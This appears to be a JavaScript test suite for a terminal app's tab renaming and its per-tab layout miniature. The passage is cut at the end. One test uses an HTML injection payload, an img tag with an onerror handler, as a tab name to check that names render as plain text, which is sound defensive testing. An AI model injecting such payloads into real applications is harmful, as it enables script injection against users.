test('tab name: Escape cancels, clicking away saves, an empty (or blank) name gives the automatic title back', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
  const t = activeTab(win);
  const auto = tabLabel(t);
  if (!needRename(env, t)) { cleanup(env); return; }
  await renameTo(env, t, 'never', 'esc');
  ok(!renameField(t) && tabLabel(t) === auto, 'Escape: the field goes, the title stays ' + show(auto) + '; got ' + show(tabLabel(t)));
  ok(rawManifest(win).indexOf('never') < 0, 'a cancelled name is not saved');
  await renameTo(env, t, 'logs', 'blur');
  ok(!renameField(t) && tabLabel(t) === 'logs', 'clicking away (blur) saves; got ' + show(tabLabel(t)));
  await renameTo(env, t, '', 'enter');
  ok(tabLabel(t) === paneLabel(activePane(win)), 'an empty name: the automatic title (the active pane\'s label ' +
     show(paneLabel(activePane(win))) + ') again; got ' + show(tabLabel(t)));
  win.activatePane(a.id);
  await until(() => tabLabel(t) === paneLabel(a), 300);
  ok(tabLabel(t) === paneLabel(a), 'and it follows the active pane again; got ' + show(tabLabel(t)));
  await renameTo(env, t, '   ', 'enter');
  ok(tabLabel(t) === paneLabel(a), 'a name of spaces only counts as empty; got ' + show(tabLabel(t)));
  cleanup(env);
});

test('tab name: once named, panes coming, going, switching or changing state never overwrite the name', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { ok(false, 'setup'); cleanup(env); return; }
  const t = activeTab(win);
  if (!needRename(env, t)) { cleanup(env); return; }
  await renameTo(env, t, 'mine', 'enter');
  const seen = [];
  const look = what => { if (tabLabel(t) !== 'mine' || !/mine/.test(tipOf(t))) seen.push(what + ': ' + show(tabLabel(t)) + ' / ' + show(tipOf(t))); };
  look('renamed');
  const b = await tSplit(win, a, 'h', 'b.host');
  look('after a split');
  win.activatePane(a.id); look('after switching panes');
  b.reconnecting = true; win.updatePaneBadge(b); look('while a pane reconnects');
  b.reconnecting = false; win.updatePaneBadge(b);
  const c = await tNewTab(win, 'c.host');
  look('after + made another tab');
  clickTab(win, t); await until(() => activeTab(win) === t, 500); look('shown again');
  win.closePane(b.id); await sleep(50); look('after closing a pane');
  ok(seen.length === 0, 'the tab keeps its name everywhere; lost it: ' + show(seen));
  ok(c && tabLabel(tabElOfPane(win, c)) === paneLabel(c), 'the other tab keeps its automatic title');
  cleanup(env);
});

test('tab name: names are saved at once and survive a reload, in the strip order', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  const c = b && await tNewTab(win, 'c.host');
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const [tA, tB] = [tabElOfPane(win, a), tabElOfPane(win, b)];
  if (!needRename(env, tA)) { cleanup(env); return; }
  await renameTo(env, tA, 'alpha', 'enter');
  await renameTo(env, tB, 'beta', 'blur');
  ok(rawManifest(win).indexOf('alpha') >= 0 && rawManifest(win).indexOf('beta') >= 0, 'both names are in the saved layout at once');
  const want = tabEls(win).map(tabLabel);
  ok(show(want) === show(['alpha', 'beta', paneLabel(c)]), 'setup: titles ' + show(want));
  const front = tabLabel(activeTab(win));
  const snap = snapshotStorage(win);
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap, S4); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 3, 2000);
  await sleep(50);
  const got = tabEls(w2).map(tabLabel);
  ok(show(got) === show(want), 'after a reload the same titles in the same order; got ' + show(got) + ' want ' + show(want));
  ok(tabEls(w2).every(t => tipOf(t).indexOf(tabLabel(t)) >= 0), 'and tooltips; got ' + show(tabEls(w2).map(tipOf)));
  ok(tabLabel(activeTab(w2)) === front, 'the same tab in front: ' + show(tabLabel(activeTab(w2))));
  // The automatic one still follows its pane after the reload.
  const c2 = paneList(w2).find(p => p.host === 'c.host');
  ok(!!c2 && tabLabel(tabElOfPane(w2, c2)) === paneLabel(c2), 'the unnamed tab is still automatic');
  cleanup(env2);
});

test('tab name: a name stays with its tab through moves and merges; a merged-away tab takes its name with it', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a1, a2] = await splitTabEnv(win, ['a1.host', 'a2.host']);
  if (!needTabs(win) || !needMove(win) || !a1 || !a2) { ok(false, 'setup'); cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  const c = b && await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b);
  if (!needRename(env, tabById(win, tA))) { cleanup(env); return; }
  await renameTo(env, tabById(win, tA), 'Alpha', 'enter');
  await renameTo(env, tabById(win, tB), 'Beta', 'enter');
  const nameOf = id => tabLabel(tabById(win, id));
  win.movePaneToNewTab(a2.id);
  ok(nameOf(tA) === 'Alpha', 'a pane moved out: the tab keeps "Alpha"; got ' + show(nameOf(tA)));
  ok(tabLabel(tabElOfPane(win, a2)) === paneLabel(a2), 'the new tab is automatic, not "Alpha"; got ' + show(tabLabel(tabElOfPane(win, a2))));
  win.movePaneToTab(c.id, tA);
  ok(nameOf(tA) === 'Alpha', 'a pane moved in: still "Alpha"; got ' + show(nameOf(tA)));
  win.mergeTabInto(tB, a1.id, 'left');
  ok(nameOf(tA) === 'Alpha', 'a tab merged in: the target keeps "Alpha"; got ' + show(nameOf(tA)));
  ok(!tabEls(win).some(t => tabLabel(t) === 'Beta'), 'no tab is called "Beta" any more; titles ' + show(tabEls(win).map(tabLabel)));
  win.movePaneToNewTab(b.id);
  ok(tabLabel(tabElOfPane(win, b)) === paneLabel(b), 'b taken out again gets an automatic title, not the old "Beta"; got ' +
     show(tabLabel(tabElOfPane(win, b))));
  ok(rawManifest(win).indexOf('Beta') < 0, 'and "Beta" is not in the saved layout any more');
  const want = tabEls(win).map(tabLabel);
  const snap = snapshotStorage(win);
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap, S4); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 4, 2000);
  await sleep(50);
  ok(show(tabEls(w2).map(tabLabel)) === show(want), 'reloaded: ' + show(tabEls(w2).map(tabLabel)) + ' want ' + show(want));
  cleanup(env2);
});

test('tab name: a double-click on another tab shows it as a click would and edits it; no drag, no close, order kept', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabElOfPane(win, a);
  const order0 = tabEls(win).map(tabId);
  const saved0 = JSON.stringify(savedShapes(win).tabs);
  dblTab(win, tA);
  const inp = renameField(tA);
  ok(!!inp, 'the double-clicked tab A shows the field');
  ok(activeTab(win) === tA, 'A is in front, as after a click');
  ok(show(tabEls(win).map(tabId)) === show(order0) && tabEls(win).length === 3, 'order and count unchanged; got ' + show(tabEls(win).map(tabId)));
  ok(noDragLeft(win) && JSON.stringify(savedShapes(win).tabs) === saved0, 'no drag state, layout unchanged');
  ok(!tabEls(win).some(t => t !== tA && renameField(t)), 'only A has a field');
  if (inp) keyOn(win, inp, 'Escape', 'Escape');
  cleanup(env);
});

test('tab name (break): a name is text, never HTML; a very long one is cut to a sane length', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { ok(false, 'setup'); cleanup(env); return; }
  const t = activeTab(win);
  if (!needRename(env, t)) { cleanup(env); return; }
  const evil = '<img src=x onerror="window.__xss=1"><b>bold</b>';
  await renameTo(env, t, evil, 'enter');
  await sleep(30);
  ok(tabLabel(t) === evil, 'the name shows literally; got ' + show(tabLabel(t)));
  ok(!t.querySelector('img') && !t.querySelector('b'), 'no element made from it');
  ok(tipOf(t).indexOf(evil) >= 0, 'the tooltip has it literally');
  ok(!win.__xss, 'no script ran');
  await renameTo(env, t, 'x'.repeat(5000), 'enter');
  const n = (tabLabel(t) || '').length;
  ok(n >= 20 && n <= 100, 'a 5000-character name is kept to a sane length (20..100 chars); got ' + n);
  ok(rawManifest(win).indexOf('x'.repeat(200)) < 0, 'and saved cut, too');
  cleanup(env);
});

test('tab name (break): while editing, tab keys, a press in the field and the tab re-rendering leave the field alone', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry]), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tB = tabElOfPane(win, b);
  dblTab(win, tB);
  const inp = renameField(tB);
  ok(!!inp, 'B\'s field is open');
  if (!inp) { cleanup(env); return; }
  typeName(win, inp, 'half');
  const acted = [];
  [['Digit1', '1', {alt: true}], ['KeyW', 'w', {alt: true}], ['KeyT', 't', {alt: true}], ['BracketLeft', '{', {alt: true, shift: true}]]
    .forEach(k => {
      keyOn(win, inp, k[0], k[1], k[2]);
      if (activeTab(win) !== tB || tabEls(win).length !== 2 || !hidden($(win, 'ov')) || !hidden($(win, 'confirmOv')) || !inp.isConnected) {
        acted.push(k[0]);
        if (!hidden($(win, 'ov'))) win.cancelConnect();
      }
    });
  ok(acted.length === 0, 'Alt+1 / Alt+W / Alt+T / Alt+Shift+[ in the field do nothing to the tabs; acted: ' + show(acted));
  // A press in the field (to place the caret, or select by dragging).
  const f0 = b.term._focusCalls;
  const m = pointer(win);
  const [x, y] = centre(inp);
  const md = new win.MouseEvent('mousedown', {bubbles: true, cancelable: true, button: 0, buttons: 1, clientX: x, clientY: y, view: win});
  inp.dispatchEvent(md);
  m.move(inp, x + 40, y); m.move(inp, x + 80, y + 2); m.up(inp, x + 80, y + 2);
  ok(!md.defaultPrevented, 'a press in the field is not prevented (the caret can be placed, text selected)');
  ok(noDragLeft(win) && tabEls(win).length === 2 && activeTab(win) === tB, 'and does not start a tab drag');
  ok(b.term._focusCalls === f0, 'and does not move the focus to the terminal (' + (b.term._focusCalls - f0) + ' focus calls)');
  ok(inp.isConnected && renameField(tB) === inp, 'the field is still there');
  // The tab re-renders under the field (state change, output elsewhere).
  b.reconnecting = true; win.updatePaneBadge(b);
  win.noteTabActivity(a);
  b.reconnecting = false; win.updatePaneBadge(b);
  ok(inp.isConnected && renameField(tB) === inp && inp.value === 'half', 'a re-render of the tab keeps the field and what was typed; field ' +
     (inp.isConnected ? 'there, value ' + show(inp.value) : 'gone'));
  keyOn(win, inp, 'Enter', 'Enter');
  await until(() => !renameField(tB), 300);
  ok(tabLabel(tB) === 'half', 'Enter saves what was typed; got ' + show(tabLabel(tB)));
  await sleep(60);
  ok(rec.all() === '', 'nothing reached a shell; got ' + show(rec.all()));
  cleanup(env);
});

// =====================================================================
// Feature 2: the marker draws the tab's layout
// =====================================================================
test('marker: a miniature of the tab\'s splits, one box per pane, the active pane highlighted; hidden for one pane', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { ok(false, 'setup'); cleanup(env); return; }
  const t = activeTab(win);
  ok(miniProblems(env, t).length === 0, 'one pane: no marker; ' + show(miniProblems(env, t)));
  const b = await tSplit(win, a, 'h', 'b.host');
  ok(miniProblems(env, t).length === 0, 'a | b: ' + show(miniProblems(env, t)));
  win.activatePane(a.id);
  ok(miniProblems(env, t).length === 0, 'a made active, its box is the lit one: ' + show(miniProblems(env, t)));
  const c = await tSplit(win, b, 'v', 'c.host');
  ok(flatShape(win, tabId(t)) === '(h a.host (v b.host c.host))', 'setup: a | (b over c); got ' + flatShape(win, tabId(t)));
  ok(miniProblems(env, t).length === 0, 'a | (b over c), c active: ' + show(miniProblems(env, t)));
  const d = await tSplit(win, a, 'v', 'd.host');
  ok(miniProblems(env, t).length === 0, '(a over d) | (b over c): ' + show(miniProblems(env, t)));
  win.closePane(c.id); await sleep(30);
  ok(miniProblems(env, t).length === 0, 'c closed: ' + show(miniProblems(env, t)));
  win.closePane(d.id); win.closePane(b.id); await sleep(30);
  ok(miniProblems(env, t).length === 0, 'back to one pane, no marker: ' + show(miniProblems(env, t)));
  cleanup(env);
});

test('marker: follows moves and merges in every tab, also hidden ones, and comes back the same after a reload', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a1, a2] = await splitTabEnv(win, ['a1.host', 'a2.host']);
  if (!needTabs(win) || !needMove(win) || !a1 || !a2) { ok(false, 'setup'); cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  const c1 = b && await tNewTab(win, 'c1.host');
  const c2 = c1 && await tSplit(win, c1, 'v', 'c2.host');
  if (!c2) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b);
  const steps = [];
  const step = what => { const p = allMiniProblems(env); if (p.length) steps.push(what + ': ' + p.join('; ')); };
  step('start');
  win.mergeTabInto(tB, a2.id, 'bottom'); step('B merged under a2');
  win.movePaneToNewTab(a1.id); step('a1 out to a new tab');
  win.movePaneToTab(c2.id, tA); step('c2 into A');
  win.activatePane(c1.id); step('C shown (A hidden, its marker still right)');
  win.movePaneToTab(a1.id, tA); step('a1 back into A');
  win.activatePane(b.id); step('b active in A');
  ok(steps.length === 0, 'the marker matched the layout after every step; wrong: ' + show(steps));
  const snap = snapshotStorage(win);
  const n = paneList(win).length;
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap, S4); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === n, 2000);
  await sleep(50);
  const p2 = allMiniProblems(env2);
  ok(p2.length === 0, 'after a reload every marker matches its tab; wrong: ' + show(p2));
  cleanup(env2);
});

test('marker: not redrawn on output frames, only when the layout or the active pane changes; theme colours, no literal colours', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
  const t = activeTab(win);
  const rs = miniRects(t);
  ok(!!rs && rs.length === 2, 'setup: the miniature is there; ' + show(miniProblems(env, t)));
  if (!rs) { cleanup(env); return; }
  await sleep(100);
  let muts = 0;
  const sp = t.querySelector('.tab-split');
  const mo = new win.MutationObserver(l => { muts += l.length; });
  mo.observe(sp, {attributes: true, childList: true, subtree: true, characterData: true});
  for (let i = 0; i < 300; i++) { win.updatePaneBadge(a); win.updatePaneBadge(b); }
  await sleep(250);              // real output polls run meanwhile
  await new Promise(r => win.setTimeout(r, 0));
  ok(muts === 0, '600 output-frame updates and 250 ms of polling: the marker untouched; ' + muts + ' DOM changes');
  win.activatePane(win.activeId === a.id ? b.id : a.id);
  await new Promise(r => win.setTimeout(r, 0));
  ok(muts > 0 && miniProblems(env, t).length === 0, 'switching the active pane does redraw it: ' + muts + ' changes, ' + show(miniProblems(env, t)));
  mo.disconnect();
  const lit = miniRects(t).map(r => ['fill', 'stroke', 'style', 'color'].map(k => r.el.getAttribute(k) || '').join(' ')).join(' ') +
    ' ' + (sp.querySelector('svg').getAttribute('style') || '');
  ok(!/#[0-9a-f]{3,8}\b|rgba?\(|hsla?\(/i.test(lit), 'no literal colour in the svg (theme via CSS); got ' + show(lit));
  const css = Array.from(win.document.querySelectorAll('style')).map(s => s.textContent).join('\n');
  ok(/\.tab-split[^{]*\{[^}]*var\(--/.test(css), 'index.html styles the miniature with theme variables (a .tab-split rule using var(--...))');
  cleanup(env);
});

// =====================================================================
// The marker follows the split proportions (a dragged handle, a restored
// layout), not only the arrangement.
//
// Hooks / assumptions:
//   - the real proportion of a split is its two children's flex-grow
//     (style.flex as the handle drag and the layout restore write it;
//     '' = the CSS default 1). The test layout model gives every box the
//     same size, so a marker that measured the panes would see 50/50:
//     the marker must read the proportions from the flex values.
//   - for each split the rects of the panes under its first child and
//     under its second child span a 1 px gap; the first child's span is
//     ratio * (span of both - 1) +- 1 px; every rect >= 1x1 px, inside
//     the viewBox; the rects together still fill the viewBox.
//   - a drag is a real mousedown on .split-handle, mousemoves, a mouseup
//     (the drag maps clientX/Y over the wrapper's box to the ratio).
// =====================================================================
const flexGrow = el => { const g = parseFloat(el.style.flexGrow); return isFinite(g) ? g : 1; };
const layoutKids = el => Array.from(el.children).filter(c => c.classList.contains('pane') || c.classList.contains('split-h') || c.classList.contains('split-v'));
const panesIn = el => el.classList.contains('pane') ? [el.getAttribute('data-pane')]
  : Array.from(el.querySelectorAll('.pane')).map(e => e.getAttribute('data-pane'));
// The fewest pixels a subtree needs along an axis (1 px per pane, 1 px gaps).
function minNeed(el, horiz) {
  if (el.classList.contains('pane')) return 1;
  const k = layoutKids(el);
  if (k.length < 2) return k.length ? minNeed(k[0], horiz) : 1;
  const same = el.classList.contains(horiz ? 'split-h' : 'split-v');
  return same ? minNeed(k[0], horiz) + 1 + minNeed(k[1], horiz) : Math.max(minNeed(k[0], horiz), minNeed(k[1], horiz));
}
const nameOf = (win, el) => el.classList.contains('pane')
  ? ((win.panes[el.getAttribute('data-pane')] || {}).host || el.getAttribute('data-pane'))
  : (el.classList.contains('split-h') ? 'h(' : 'v(') + layoutKids(el).map(c => nameOf(win, c)).join(',') + ')';
// Everything wrong with the proportions drawn in tab element tEl's marker.
function miniRatioProblems(env, tEl) {
  const win = env.win;
  const tid = tabId(tEl);
  if (panesOfTab(win, tid).length < 2) return [];
  const rs = miniRects(tEl);
  if (!rs || !rs.length) return ['no miniature'];
  const by = {}; rs.forEach(r => { by[r.pane] = r; });
  const out = [];
  const svg = tEl.querySelector('.tab-split svg');
  const vb = (svg.getAttribute('viewBox') || '').trim().split(/[\s,]+/).map(Number);
  rs.forEach(r => {
    if (!(r.w >= 1 && r.h >= 1)) out.push('rect ' + r.pane + ' is ' + r.w + 'x' + r.h + ' px (each pane at least 1 px)');
    if (vb.length === 4 && (r.x < vb[0] - 0.01 || r.y < vb[1] - 0.01 || r.x + r.w > vb[0] + vb[2] + 0.01 || r.y + r.h > vb[1] + vb[3] + 0.01))
      out.push('rect ' + r.pane + ' outside the viewBox');
  });
  const span = (el, horiz) => {
    const ids = panesIn(el).filter(id => by[id]);
    if (!ids.length) return null;
    const s = Math.min.apply(null, ids.map(id => horiz ? by[id].x : by[id].y));
    const e = Math.max.apply(null, ids.map(id => horiz ? by[id].x + by[id].w : by[id].y + by[id].h));
    return {s, e, len: e - s};
  };
  const root = tabRootById(win, tid);
  const top = root && layoutKids(root)[0];
  if (top && vb.length === 4) {
    const sx = span(top, true), sy = span(top, false);
    if (sx && sy && (sx.s > vb[0] + 0.01 || sx.e < vb[0] + vb[2] - 0.01 || sy.s > vb[1] + 0.01 || sy.e < vb[1] + vb[3] - 0.01))
      out.push('the rects do not fill the miniature: x ' + sx.s + '..' + sx.e + ', y ' + sy.s + '..' + sy.e + ' of ' + vb.join(' '));
  }
  const walk = el => {
    if (!el || el.classList.contains('pane')) return;
    const k = layoutKids(el);
    k.forEach(walk);
    if (k.length < 2) return;
    const horiz = el.classList.contains('split-h');
    const A = span(k[0], horiz), B = span(k[1], horiz);
    if (!A || !B) return;
    const ratio = flexGrow(k[0]) / (flexGrow(k[0]) + flexGrow(k[1]));
    const drawable = B.e - A.s - 1;
    const ideal = ratio * drawable;
    // Where a 1 px minimum must win over the proportion, only the minimum is asked for.
    if (ideal < minNeed(k[0], horiz) + 0.5 || drawable - ideal < minNeed(k[1], horiz) + 0.5) return;
    const what = nameOf(win, el) + ' at ' + Math.round(ratio * 100) + '/' + Math.round((1 - ratio) * 100);
    if (Math.abs(A.len - ideal) > 1.0001)
      out.push(what + ': first part drawn ' + A.len + ' of ' + drawable + ' px, want ~' + ideal.toFixed(1) + ' (+-1)');
    if (Math.abs(B.s - A.e - 1) > 0.01) out.push(what + ': gap ' + (B.s - A.e) + ' px, want 1');
  };
  walk(top);
  return out;
}
const allMiniRatioProblems = env => tabEls(env.win).reduce((o, t) => o.concat(miniRatioProblems(env, t).map(x => tabId(t) + ': ' + x)), []);
const handleOf = wrap => wrap && Array.from(wrap.children).find(c => c.classList.contains('split-handle'));
const wrapOf = p => p.el.parentElement;
// A real handle drag of split `wrap` to `ratio` (what the drag maps the pointer to).
function dragSplit(win, wrap, ratio, o) {
  o = o || {};
  const h = handleOf(wrap);
  if (!h) return null;
  const horiz = wrap.classList.contains('split-h');
  const r = wrap.getBoundingClientRect();
  const at = q => horiz ? [r.left + q * r.width, r.top + r.height / 2] : [r.left + r.width / 2, r.top + q * r.height];
  const from = flexGrow(layoutKids(wrap)[0]) / (flexGrow(layoutKids(wrap)[0]) + flexGrow(layoutKids(wrap)[1]));
  const m = pointer(win);
  let [x, y] = at(from);
  m.down(h, x, y);
  const n = o.steps || 8;
  for (let i = 1; i <= n; i++) { [x, y] = at(from + (ratio - from) * i / n); m.move(h, x, y); }
  if (!o.noUp) m.up(h, x, y);
  return {m, h, at};
}
const ratioOf = el => flexGrow(el) / (flexGrow(el) + flexGrow(el.nextElementSibling && el.nextElementSibling.classList.contains('split-handle') ? el.nextElementSibling.nextElementSibling : el.nextElementSibling));
// Wait (up to ms) until tab element t's marker draws the proportions; ms taken, or -1.
async function ratiosShown(env, t, ms) {
  const t0 = _now();
  const got = await until(() => miniRatioProblems(env, t).length === 0, ms || 300);
  return got ? Math.round(_now() - t0) : -1;
}

test('marker ratio: a dragged split handle (h and v, nested) is drawn in its proportions within 300 ms of release, each pane at least 1 px', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
  const t = activeTab(win);
  ok(miniRatioProblems(env, t).length === 0, 'setup: 50/50 drawn as halves; ' + show(miniRatioProblems(env, t)));
  const outer = wrapOf(a);
  ok(!!handleOf(outer), 'setup: the split has a .split-handle');
  if (!handleOf(outer)) { cleanup(env); return; }
  // a | b dragged to 70/30.
  dragSplit(win, outer, 0.7);
  ok(Math.abs(ratioOf(a.el) - 0.7) < 0.01, 'setup: the drag set a to 70% (flex ' + show(a.el.style.flex) + ' / ' + show(b.el.style.flex) + ')');
  let ms = await ratiosShown(env, t);
  const r1 = miniRects(t) || [];
  ok(ms >= 0, 'a | b dragged to 70/30: the left box takes ~70% (within 300 ms of release); ' +
     show(miniRatioProblems(env, t)) + ' rects ' + show(r1.map(r => r.pane + ':' + r.x + '+' + r.w)));
  // and back to 25/75.
  dragSplit(win, outer, 0.25);
  ms = await ratiosShown(env, t);
  ok(ms >= 0, 'dragged on to 25/75: redrawn; ' + show(miniRatioProblems(env, t)));
  // b split under: c; the vertical handle dragged to 30/70; outer to 60/40.
  const c = await tSplit(win, b, 'v', 'c.host');
  if (!c) { ok(false, 'setup: c'); cleanup(env); return; }
  dragSplit(win, wrapOf(c), 0.3);
  ms = await ratiosShown(env, t);
  ok(ms >= 0, 'a | (b over c), b over c dragged to 30/70: the upper box ~30% of the height; ' + show(miniRatioProblems(env, t)));
  dragSplit(win, wrapOf(a), 0.6);
  ms = await ratiosShown(env, t);
  ok(ms >= 0, 'then the outer handle to 60/40: both proportions drawn; ' + show(miniRatioProblems(env, t)));
  ok(miniProblems(env, t).length === 0, 'and still the right arrangement and active pane; ' + show(miniProblems(env, t)));
  // Extremes: the drag's limits 10/90 and 90/10, nested.
  const d = await tSplit(win, a, 'h', 'd.host');
  if (!d) { ok(false, 'setup: d'); cleanup(env); return; }
  dragSplit(win, wrapOf(d), 0.9);
  dragSplit(win, wrapOf(d).parentElement, 0.1);
  dragSplit(win, wrapOf(c), 0.9);
  await sleep(350);
  const small = (miniRects(t) || []).filter(r => !(r.w >= 1 && r.h >= 1));
  ok(miniRects(t) && miniRects(t).length === 4 && small.length === 0,
     '(a | d) at 10% of the width, a | d 90/10, b over c 90/10: every pane still at least 1x1 px; ' +
     show((miniRects(t) || []).map(r => r.pane + ':' + r.w + 'x' + r.h)));
  ok(miniRatioProblems(env, t).length === 0, 'and where the pixels allow, the proportions; ' + show(miniRatioProblems(env, t)));
  cleanup(env);
});

test('marker ratio: cheap - no DOM change while a drag stays within one pixel, none for 600 output frames or a window resize; correct after release', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
  const t = activeTab(win);
  const sp = t.querySelector('.tab-split');
  const wrap = wrapOf(a);
  // Press, go to 65% (a ratio well inside a pixel at this size: 0.65 * 15 = 9.75)
  // and stay pressed until any throttled update has run.
  const g = dragSplit(win, wrap, 0.65, {noUp: true});
  if (!g) { ok(false, 'setup: no handle'); cleanup(env); return; }
  await sleep(350);
  let muts = 0;
  const mo = new win.MutationObserver(l => { muts += l.length; });
  mo.observe(sp, {attributes: true, childList: true, subtree: true, characterData: true});
  // 200 moves of +-1 px around 65% (720 px wide: +-0.0014).
  for (let i = 0; i < 200; i++) { const [x, y] = g.at(0.65 + (i % 2 ? 1 : -1) / 720); g.m.move(g.h, x, y); }
  await sleep(350);
  ok(muts === 0, '200 mousemoves of +-1 px during the drag (no box changes size): the marker untouched; ' + muts + ' DOM changes');
  // A sweep 65% -> 75% in 100 moves: the left box grows by ~1-2 px, so a few changes, not one per move.
  muts = 0;
  for (let i = 1; i <= 100; i++) { const [x, y] = g.at(0.65 + 0.1 * i / 100); g.m.move(g.h, x, y); }
  await sleep(350);
  ok(muts <= 20, 'a 100-move sweep 65% -> 75% (1-2 px in the miniature): at most a handful of DOM changes, not one per move; ' + muts);
  const [ux, uy] = g.at(0.75);
  g.m.up(g.h, ux, uy);
  const ms = await ratiosShown(env, t);
  ok(ms >= 0, 'released at 75/25: drawn so within 300 ms; ' + show(miniRatioProblems(env, t)));
  await sleep(100);
  // Output frames.
  muts = 0;
  for (let i = 0; i < 300; i++) { win.updatePaneBadge(a); win.updatePaneBadge(b); }
  await sleep(250);
  ok(muts === 0, '600 updatePaneBadge calls (output frames) with a 75/25 split: the marker untouched; ' + muts + ' DOM changes');
  // A window resize: proportions unchanged.
  muts = 0;
  env.lay.box = {cols: 120, rows: 40};
  win.dispatchEvent(new win.Event('resize'));
  await sleep(400);
  env.lay.box = {cols: 70, rows: 20};
  win.dispatchEvent(new win.Event('resize'));
  await sleep(400);
  ok(muts === 0, 'two window resizes (proportions unchanged): the marker untouched; ' + muts + ' DOM changes');
  ok(miniRatioProblems(env, t).length === 0, 'and it still draws 75/25; ' + show(miniRatioProblems(env, t)));
  mo.disconnect();
  cleanup(env);
});

test('marker ratio: proportions come back after a reload, and follow split / close / move / merge, also in hidden tabs', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !needMove(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
  const c = await tSplit(win, b, 'v', 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  dragSplit(win, wrapOf(a), 0.7);
  dragSplit(win, wrapOf(c), 0.25);
  const tA = tabOfPane(a);
  // A second tab, its own split at 30/70, in front: A is hidden from here on.
  const x = await tNewTab(win, 'x.host');
  const y = x && await tSplit(win, x, 'h', 'y.host');
  if (!y) { ok(false, 'setup'); cleanup(env); return; }
  dragSplit(win, wrapOf(x), 0.3);
  await sleep(350);
  const steps = [];
  const step = what => { const p = allMiniRatioProblems(env); if (p.length) steps.push(what + ': ' + p.join('; ')); };
  step('A 70/30 with b over c 25/75 (hidden), X 30/70 in front');
  ok(steps.length === 0, 'the drawn proportions match in both tabs; wrong: ' + show(steps));
  // Reload.
  const snap = snapshotStorage(win);
  const n = paneList(win).length;
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap, S4); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === n, 2000);
  await sleep(50);
  const ra = paneList(w2).find(p => p.host === 'a.host');
  ok(!!ra && Math.abs(ratioOf(ra.el) - 0.7) < 0.01, 'setup: the reload restored a at 70% (' + (ra ? show(ra.el.style.flex) : 'no a') + ')');
  const p2 = allMiniRatioProblems(env2);
  ok(p2.length === 0, 'after a reload every marker draws its saved proportions (the hidden tab too); wrong: ' + show(p2));
  // Layout changes, each checked in every tab.
  const P = h => paneList(w2).find(p => p.host === h);
  const steps2 = [];
  const step2 = what => { const p = allMiniRatioProblems(env2); if (p.length) steps2.push(what + ': ' + p.join('; ')); };
  const tA2 = tabOfPane(P('a.host')), tX2 = tabOfPane(P('x.host'));
  w2.movePaneToTab(P('y.host').id, tA2); step2('y moved into A');
  w2.closePane(P('c.host').id); await sleep(30); step2('c closed');
  w2.movePaneToNewTab(P('b.host').id); step2('b out to a new tab');
  w2.mergeTabInto(tabOfPane(P('b.host')), P('a.host').id, 'bottom'); step2('b\'s tab merged under a');
  const e = await tSplit(w2, P('x.host'), 'h', 'e.host'); step2('x split: e');
  if (e) { dragSplit(w2, wrapOf(e), 0.8); await sleep(350); step2('x | e dragged to 80/20'); }
  // Make X hidden, then change X's layout: its hidden marker must follow.
  w2.activatePane(P('a.host').id); step2('A shown');
  w2.movePaneToTab(P('b.host').id, tX2); step2('b moved into hidden X');
  w2.closePane(P('e.host') ? P('e.host').id : ''); await sleep(30); step2('e closed in hidden X');
  ok(steps2.length === 0, 'after every split / close / move / merge each marker drew its tab\'s proportions; wrong: ' + show(steps2));
  cleanup(env2);
});

// =====================================================================
// A split or a close leaves every other divider where it was.
//
